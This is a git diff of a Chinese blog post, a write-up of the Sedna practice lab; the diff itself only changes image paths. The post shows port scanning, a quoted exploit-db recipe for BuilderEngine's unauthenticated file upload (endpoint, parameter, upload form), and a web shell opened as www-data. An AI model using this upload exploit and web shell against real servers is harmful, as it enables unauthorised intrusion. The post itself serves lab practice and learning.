@@ -85,16 +85,16 @@
 <meta property="og:site_name" content="HexChristmas&#39;s Blog">
 <meta property="og:description" content="这段时间自己练了一些靶场">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://hexchristmas.github.io/p/2d97d5ef.htm/w1.png">
-<meta property="og:image" content="https://hexchristmas.github.io/p/2d97d5ef.htm/w2.png">
-<meta property="og:image" content="https://hexchristmas.github.io/p/2d97d5ef.htm/w3.png">
-<meta property="og:image" content="https://hexchristmas.github.io/p/2d97d5ef.htm/w4.png">
-<meta property="og:image" content="https://hexchristmas.github.io/p/2d97d5ef.htm/w5.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/w1.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/w2.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/w3.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/w4.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/w5.png">
 <meta property="og:updated_time" content="2020-04-09T11:10:57.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sedna靶场">
 <meta name="twitter:description" content="这段时间自己练了一些靶场">
-<meta name="twitter:image" content="https://hexchristmas.github.io/p/2d97d5ef.htm/w1.png">
+<meta name="twitter:image" content="https://hexchristmas.github.io/p/w1.png">
 
 
 
@@ -320,7 +320,7 @@
       
         <h1>信息收集</h1>
 <h2 id="Nmap">Nmap</h2>
-<p><img src="/p/2d97d5ef.htm/w1.png" alt="%E5%9B%BE%E7%89%87%201|690x423"></p>
+<p><img src="//hexchristmas.github.io/p/w1.png" alt="%E5%9B%BE%E7%89%87%201|690x423"></p>
 <h3 id="开放端口：">开放端口：</h3>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22 53 80 110 111 139 143 445 993 995 8080</span><br></pre></td></tr></table></figure>
 <h3 id="开放服务：">开放服务：</h3>
@@ -480,19 +480,19 @@
 <p>根据nmap扫描出来的端口和服务看了看貌似没啥能利用的漏洞，看一下dirb都爬到了什么信息，全部看完，发现没什么思路，又仔细看了第二遍，发现</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.88.134/license.txt</span><br></pre></td></tr></table></figure>
 <p>这个地方<br>
-<img src="/p/2d97d5ef.htm/w2.png" alt="2|690x316"><br>
+<img src="//hexchristmas.github.io/p/w2.png" alt="2|690x316"><br>
 看到Radian Enterprise，Enterprise貌似是企业的意思，放到google里搜索一圈，</p>
 <p>看到Radian Enterprise，Enterprise貌似是企业的意思，放到google里搜索一圈，<br>
-<img src="/p/2d97d5ef.htm/w3.png" alt="3|690x386"></p>
+<img src="//hexchristmas.github.io/p/w3.png" alt="3|690x386"></p>
 <h1>漏洞利用</h1>
 <h2 id="初步利用">初步利用</h2>
 <p>谷歌告诉我们这个的确存在漏洞，漏洞大概在BuilderEngine任意文件上传，<br>
 查看exploit-db，</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) Unauthenticated Unrestricted File Upload:</span><br><span class="line">	POST /themes/dashboard/assets/plugins/jquery-file-upload/server/php/</span><br><span class="line">	Vulnerable Parameter: files[]</span><br><span class="line">	We can upload test.php and reach the file via the following link:</span><br><span class="line">	/files/test.php--&gt;&lt;html&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;file&quot; name=&quot;files[]&quot; /&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; value=&quot;send&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 <p>告诉我们，要我们把下面的代码以post方式传上去<br>
-<img src="/p/2d97d5ef.htm/w4.png" alt="4|690x386"></p>
+<img src="//hexchristmas.github.io/p/w4.png" alt="4|690x386"></p>
 <p>用蚁剑连接shell<br>
-<img src="/p/2d97d5ef.htm/w5.png" alt="5|690x450"></p>
+<img src="//hexchristmas.github.io/p/w5.png" alt="5|690x450"></p>
 <p>查看第一个<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![6|690x456](w6.png) </span><br><span class="line"></span><br><span class="line">## 深度利用</span><br><span class="line">深入，我们发现我们的用户是www-data权限，我们cat /etc/os-release发现这个系统是ubuntu14.04.1，其实我们</span><br></pre></td></tr></table></figure></p>
 <p>NAME=“Ubuntu”<br>
 VERSION=“14.04.1 LTS, Trusty Tahr”<br>
